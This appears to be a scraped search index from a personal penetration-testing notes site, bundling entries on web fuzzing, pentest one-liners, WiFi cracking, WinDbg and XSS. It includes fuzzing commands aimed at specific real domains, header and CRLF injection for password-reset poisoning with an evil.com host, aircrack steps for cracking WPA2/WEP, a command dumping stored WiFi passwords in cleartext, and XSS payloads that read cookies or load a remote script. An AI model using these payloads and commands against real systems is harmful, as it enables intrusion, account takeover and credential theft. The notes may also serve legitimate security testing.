Socket [+] Click Jacking [+] No rate limit [+] CMDI [+] Directory Traversal [+] HTTP Request Smugling [+] Subdomain Takeover [+] Wordpress [+] Joomla [+] Drupal [+] HSTS [+] Host Header Attack [+] Password reset [+] Session Management [+] Github [+] HeartBleed [+] SSI [+] Recon [+] URL Rerdirect [+] HTMLi [+] SPF recored [+] Critical File Found [+] Source Code Disclosure ",url:"https://duraki.github.io/notes/web-application-penetration-test-checklist/"},"https:\/\/duraki.github.io\/notes\/web-fuzzing-technqiues\/":{title:"Web Fuzzing Technqiues",tags:[],content:" Use SecList seed fuzz Use FuzzDB seed fuzz  Using Gobuster || FFuF Gobuster fuzzing:\ncat ~/SecLists/Discovery/Web-Content/Common-DB-Backups.txt \\ ~/SecLists/Discovery/Web-Content/Common-PHP-Filenames.txt \\ ~/SecLists/Discovery/Web-Content/PHP.fuzz.txt \\ ~/SecLists/Discovery/Web-Content/common.txt \\ /tmp/php_files_only.txt | gobuster fuzz -u \\ https://www.utic.ba/FUZZ -b 404 -w - -k -t 30 ffuf fuzzing:\ncat ~/SecLists/Discovery/Web-Content/CMS/symphony-267-xslt-cms.txt \\ ~/SecLists/Discovery/Web-Content/CMS/symfony-315-demo.txt \\ ~/SecLists/Discovery/Web-Content/SVNDigger/symfony.txt \\ ~/SecLists/Discovery/Web-Content/SVNDigger/all.txt \\ ~/SecLists/Discovery/Web-Content/SVNDigger/all-dirs.txt \\ ~/SecLists/Discovery/Web-Content/SVNDigger/context/error.txt \\ ~/SecLists/Discovery/Web-Content/SVNDigger/context/index.txt \\ ~/SecLists/Discovery/Web-Content/SVNDigger/context/install.txt \\ ~/SecLists/Discovery/Web-Content/SVNDigger/context/readme.txt \\ ~/SecLists/Discovery/Web-Content/SVNDigger/context/root.txt \\ ~/SecLists/Discovery/Web-Content/SVNDigger/context/setup.txt \\ ~/SecLists/Discovery/Web-Content/SVNDigger/context/test.txt \\ ~/SecLists/Discovery/Web-Content/SVNDigger/context/debug.txt \\ ~/SecLists/Discovery/Web-Content/SVNDigger/context/admin.txt \\ ~/SecLists/Discovery/Web-Content/SVNDigger/cat/Conf/conf.txt \\ ~/SecLists/Discovery/Web-Content/SVNDigger/cat/Conf/config.txt \\ ~/SecLists/Discovery/Web-Content/SVNDigger/cat/Conf/htaccess.txt \\ ~/SecLists/Discovery/Web-Content/SVNDigger/cat/Database/inc.txt \\ ~/SecLists/Discovery/Web-Content/SVNDigger/cat/Database/ini.txt \\ ~/SecLists/Discovery/Web-Content/SVNDigger/cat/Database/sql.txt \\ ~/SecLists/Discovery/Web-Content/SVNDigger/cat/Database/xml.txt \\ ~/SecLists/Discovery/Web-Content/SVNDigger/cat/Language/php.txt \\ ~/SecLists/Discovery/Web-Content/SVNDigger/cat/Language/js.txt \\ ~/SecLists/Discovery/Web-Content/SVNDigger/cat/Language/html.txt \\ ~/SecLists/Discovery/Web-Content/SVNDigger/cat/Language/jar.txt \\ ~/SecLists/Discovery/Web-Content/api/actions-lowercase.txt \\ ~/SecLists/Discovery/Web-Content/Common-DB-Backups.txt \\ ~/SecLists/Discovery/Web-Content/Common-PHP-Filenames.txt \\ ~/SecLists/Discovery/Web-Content/PHP.fuzz.txt \\ ~/SecLists/Discovery/Web-Content/common.txt \\ /tmp/backup_files_only.txt \\ /tmp/log_files_only.txt \\ /tmp/UnixDotfiles.txt | ffuf -w - -u https://www.nic.ba/FUZZ -mc 200,204,301,302,307,401,403,405 -fs 0 Fuzz List # =\u0026gt; Symfony / Laravel Framework Discovery/Web-Content/CMS/symphony-267-xslt-cms.txt Discovery/Web-Content/CMS/symfony-315-demo.txt Discovery/Web-Content/SVNDigger/symfony.txt # =\u0026gt; many stuff Discovery/Web-Content/SVNDigger/all.txt Discovery/Web-Content/SVNDigger/all-dirs.txt Discovery/Web-Content/SVNDigger/context/error.txt Discovery/Web-Content/SVNDigger/context/index.txt Discovery/Web-Content/SVNDigger/context/install.txt Discovery/Web-Content/SVNDigger/context/readme.txt Discovery/Web-Content/SVNDigger/context/root.txt Discovery/Web-Content/SVNDigger/context/setup.txt Discovery/Web-Content/SVNDigger/context/test.txt Discovery/Web-Content/SVNDigger/context/debug.txt Discovery/Web-Content/SVNDigger/context/admin.txt Discovery/Web-Content/SVNDigger/cat/Conf/conf.txt Discovery/Web-Content/SVNDigger/cat/Conf/config.txt Discovery/Web-Content/SVNDigger/cat/Conf/htaccess.txt Discovery/Web-Content/SVNDigger/cat/Database/inc.txt Discovery/Web-Content/SVNDigger/cat/Database/ini.txt Discovery/Web-Content/SVNDigger/cat/Database/sql.txt Discovery/Web-Content/SVNDigger/cat/Database/xml.txt Discovery/Web-Content/SVNDigger/cat/Language/php.txt Discovery/Web-Content/SVNDigger/cat/Language/js.txt Discovery/Web-Content/SVNDigger/cat/Language/html.txt Discovery/Web-Content/SVNDigger/cat/Language/jar.txt Discovery/Web-Content/api/actions-lowercase.txt # =\u0026gt; ruby https://raw.githubusercontent.com/fuzzdb-project/fuzzdb/master/discovery/predictable-filepaths/webservers-appservers/Ruby_Rails.txt # =\u0026gt; mostly php stuff Discovery/Web-Content/Common-DB-Backups.txt # =\u0026gt; good stuff Discovery/Web-Content/Common-PHP-Filenames.txt # =\u0026gt; good stuff Discovery/Web-Content/PHP.fuzz.txt # =\u0026gt; good for phpmyadmins Discovery/Web-Content/common.txt # =\u0026gt; usual stuff like .git/.rc-s/dotfiles https://raw.githubusercontent.com/xajkep/wordlists/master/discovery/php_files_only.txt # =\u0026gt; more php # =\u0026gt; mostly api Discovery/Web-Content/swagger.txt # =\u0026gt; find swagger location Discovery/Web-Content/api/api_endpoints.txt # =\u0026gt; api endpoints # =\u0026gt; all web extensions are available below: Discovery/Web-Content/web-extensions.txt https://raw.githubusercontent.com/fuzzdb-project/fuzzdb/master/discovery/predictable-filepaths/filename-dirname-bruteforce/CommonWebExtensions.txt # =\u0026gt; also this one for backups https://raw.githubusercontent.com/xajkep/wordlists/master/discovery/backup_files_only.txt https://raw.githubusercontent.com/xajkep/wordlists/master/discovery/log_files_only.txt # =\u0026gt; for login/admin pages https://raw.githubusercontent.com/fuzzdb-project/fuzzdb/master/discovery/predictable-filepaths/login-file-locations/Logins.txt https://raw.githubusercontent.com/fuzzdb-project/fuzzdb/master/discovery/predictable-filepaths/login-file-locations/cfm.txt https://raw.githubusercontent.com/fuzzdb-project/fuzzdb/master/discovery/predictable-filepaths/login-file-locations/html.txt https://raw.githubusercontent.com/fuzzdb-project/fuzzdb/master/discovery/predictable-filepaths/login-file-locations/jsp.txt https://raw.githubusercontent.com/fuzzdb-project/fuzzdb/master/discovery/predictable-filepaths/login-file-locations/php.txt # =\u0026gt; webservers https://raw.githubusercontent.com/fuzzdb-project/fuzzdb/master/discovery/predictable-filepaths/webservers-appservers/Apache.txt https://raw.githubusercontent.com/fuzzdb-project/fuzzdb/master/discovery/predictable-filepaths/webservers-appservers/ApacheTomcat.txt # =\u0026gt; other ... https://raw.githubusercontent.com/fuzzdb-project/fuzzdb/master/discovery/predictable-filepaths/UnixDotfiles.txt ",url:"https://duraki.github.io/notes/web-fuzzing-technqiues/"},"https:\/\/duraki.github.io\/notes\/web-penetration-testing-oneliners\/":{title:"Web Penetration Testing Oneliners",tags:[],content:"   Also See      Check if vhost is a live on specific DNS or subdomain:\ncurl -s -H \u0026#34;Host. $SUBDOMAIN.EXAMPLE.BA\u0026#34; http://example.ba Other techniques described in vhost enumeration\nRedirect URI with a Set-Cookie in GET request:\nhttp://$EXAMPLE.BA/index.php?redirect_url=../%3f%0d%0a%09set-cookie:+hello=yoyoo Rate Limit Bypass\nHeaders: * X-Forwarded-Host: http://evil.com (Password reset poisoning) * X-Forwarded-For: 127.0.0.* (Rate Limit Bypass) Permutations: * Null byte techniques * Case sensitiveness Some other techniques can be used, ie. 403 bypass via header manipulation.\nCaptcha Bypass Tricks 😂\nCaptcha Bypass is described in separate page.\nAlso See  Checklists are provided for both REST API Issue Library as well as Web Issue Library API Abuse and Reuse 403 Bypass  ",url:"https://duraki.github.io/notes/web-penetration-testing-oneliners/"},"https:\/\/duraki.github.io\/notes\/wifi-cracking-via-aircrack\/":{title:"Wifi Cracking via Aircrack",tags:[],content:"Deploy Aircrack for cracking WPA2 / WEP in 10 seconds. Written and based on MacOS host.\n# =\u0026gt; install macports ... # =\u0026gt; install aircrack-ng $ sudo port install aircrack-ng # =\u0026gt; install latest XCode, with all Command Line Tools ... # =\u0026gt; create the following symlink $ sudo ln -s /System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport /usr/sbin/airport # =\u0026gt; identity channel to sniff $ sudo airport -s # =\u0026gt; in another terminal $ sudo airport en1 sniff [CHANNEL] # =\u0026gt; in another terminal $ aircrack-ng -1 -a 1 -b [TARGET_MAC_ADDRESS] [CAP_FILE] Note that the cap_file will be located in the /tmp/airportSniff*.cap.\n Deploy Aircrack for Ubuntu 16.04, you will need to fix AlfaNetwork drivers.\n$ echo \u0026#34;options rt2800pci nohwcrypt=1\u0026#34; | sudo tee /etc/modprobe.d/rt2800pci.conf $ sudo modprobe -rfv rt2800pci $ sudo modprobe -v rt2800pci ",url:"https://duraki.github.io/notes/wifi-cracking-via-aircrack/"},"https:\/\/duraki.github.io\/notes\/windbg-cheatsheets\/":{title:"WinDbg Cheatsheets",tags:[],content:"Just personal things related to my frustration with WinDbg (:\nThe symbol search path tells WinDbg where to look for symbol (PDB) files. The debugger needs symbol files to obtain information about code modules (function names, variable names, and the like).\n.sympath srv* Symbol search path is: srv* Expanded Symbol search path is: cache*;SRV To see the symbols for the Notepad.exe module, enter this command:\nx notepad:! Note, if ytou don7t see any output, enter .reload again:\nx notepad!*main* # =\u0026gt; 000000d0`428ff7e8 00007ff6`3282122f notepad!WinMain To put a breakpoint at notepad!WinMain, enter this command:\nbu notepad!WinMain To verify that your breakpoint was set, enter this command:\nbl # =\u0026gt; 00007ff6`32825f64 0001 (0001) 0:**** notepad!WinMain Start the process:\ng # =\u0026gt; ... # Breakpoint 0 hit # notepad!WinMain: # 00007ff6`32825f64 488bc4 mov rax,rsp To see a list of code modules that are loaded in the Notepad process, enter this command:\nlm # =\u0026gt; ... # 0:000\u0026gt; lm # start end module name # 00007ff6`32820000 00007ff6`3285a000 notepad (pdb symbols) C:\\...\\notepad.pdb # 00007ffc`ab7e0000 00007ffc`ab85b000 WINSPOOL (deferred) ... To see a stack trace, enter this command:\nk # =\u0026gt; ... # Child-SP RetAddr Call Site # 00000048`4e0cf6a8 00007ff6`3282122f notepad!WinMain # 00000048`4e0cf6b0 00007ffc`b1cf16ad notepad!WinMainCRTStartup+0x1a7 # 00000048`4e0cf770 00007ffc`b1fc4629 KERNEL32!BaseThreadInitThunk+0xd # 00000048`4e0cf7a0 00000000`00000000 ntdll!RtlUserThreadStart+0x1d ... To break in the Notepad, choose Break from the Debug Menu.\nDebug Menu -\u0026gt; Break To set and verify a breakpoint at ZwWriteFile, enter these commands:\nbu ntdll!ZwWriteFile bl To see a list of all threads in Notepapd process, enter this command (tilde):\n~ # =\u0026gt; # 0:011\u0026gt; ~ # 0 Id: 10c8.128c Suspend: 1 Teb: 00007ff6`31cdd000 Unfrozen To look at the stack trace for thread 0, enter these commands:\n~0s k # =\u0026gt; 0:011\u0026gt; ~0s USER32!SystemParametersInfoW: 00007ffc`b12a4d20 48895c2408 mov qword ptr [rsp+8], ... 0:000\u0026gt; k Child-SP RetAddr Call Site 00000033`d1e9da48 00007ffc`adfb227d USER32!SystemParametersInfoW (Inline Function) --------`-------- uxtheme!IsHighContrastMode+0x1d 00000033`d1e9da50 00007ffc`adfb2f12 uxtheme!IsThemeActive+0x4d ... 00000033`d1e9f810 00007ffc`b1cf16ad notepad!WinMainCRTStartup+0x1a7 00000033`d1e9f8d0 00007ffc`b1fc4629 KERNEL32!BaseThreadInitThunk+0xd 00000033`d1e9f900 00000000`00000000 ntdll!RtlUserThreadStart+0x1d To quit and detach from process:\nqd ",url:"https://duraki.github.io/notes/windbg-cheatsheets/"},"https:\/\/duraki.github.io\/notes\/windows-notes\/":{title:"Windows Notes",tags:[],content:"When setting up Reverse Engineering workstation, use retoolkit for a start kit.\n Extract WiFi cleartextr password\ncls \u0026amp; echo. \u0026amp; for /f \u0026#34;tokens=4 delims=: \u0026#34; %a in (\u0026#39;netsh wlan show profiles ^| find \u0026#34;Profile \u0026#34;\u0026#39;) do @echo off \u0026gt; nul \u0026amp; (netsh wlan show profiles name=%a key=clear | findstr \u0026#34;SSID Cipher Content\u0026#34; | find /v \u0026#34;Number\u0026#34; \u0026amp; echo.) \u0026amp; @echo on Active Directory\nAccess Active Directory Domain Admin via Linux:\n$ sudo apt-get realmd $ realm join example.ba --user username See also Linux Notes\nResource:\n AD Attack-Defense Windows Data Hunting  ",url:"https://duraki.github.io/notes/windows-notes/"},"https:\/\/duraki.github.io\/notes\/xss-payloads\/":{title:"XSS Payloads",tags:[],content:"JSON: {\u0026#34;email\u0026#34;:\u0026#34;some@email.com\u0026lt;/script\u0026gt;\u0026lt;script\u0026gt;alert(document.domain)//\u0026#34;} The value of REQUEST_URI was not correctly sanitizing user input, in this case, double-quotes. However, due to URL encoding, this was only exploitable in IE. https://inventory.upserve.com/login/?\u0026#39;\u0026#34;--\u0026gt;\u0026lt;script\u0026gt;confirm(document.cookie)\u0026lt;/script\u0026gt; In URL PATH: \u0026#34;accesskey=\u0026#39;x\u0026#39; onclick=\u0026#39;confirm`1`\u0026#39; // Hi\u0026#39;\u0026amp;gt;\u0026#34;\u0026lt;script src=\u0026#34;//xss-server\u0026#34;\u0026gt;\u0026lt;/script\u0026gt;\u0026lt;x=\u0026#34;{9*9}\\r\\n%0a%09%0d\u0026lt;svg\\onload=confirm(1)\u0026gt; ",url:"https://duraki.github.io/notes/xss-payloads/"}}</script><script src=https://duraki.github.io/notes/js/lunr.min.js type=text/javascript></script>
<script src=https://duraki.github.io/notes/js/search.js type=text/javascript></script></body></html>